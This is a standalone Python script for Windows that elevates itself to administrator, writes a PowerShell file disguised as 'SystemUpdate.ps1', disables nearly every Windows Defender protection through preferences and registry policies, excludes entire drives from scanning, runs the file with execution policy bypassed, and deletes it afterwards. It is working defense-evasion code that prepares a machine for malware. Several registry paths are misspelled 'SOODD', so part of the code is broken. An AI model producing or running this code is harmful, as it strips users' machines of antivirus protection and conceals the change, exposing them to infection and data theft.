import os
import ctypes
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

ps_script = """
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScriptScanning $true

reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\\SOODD\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
reg add "HKLM\\SOODD\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
reg add "HKLM\\SOODD\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f

Timeout /t 3 /nobreak

Add-MpPreference -ExclusionPath "C:\\"
Add-MpPreference -ExclusionPath "D:\\"
"""

with open('C:\\Windows\\Temp\\SystemUpdate.ps1', 'w') as f:
    f.write(ps_script)

os.system('powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\SystemUpdate.ps1')
os.remove('C:\\Windows\\Temp\\SystemUpdate.ps1')
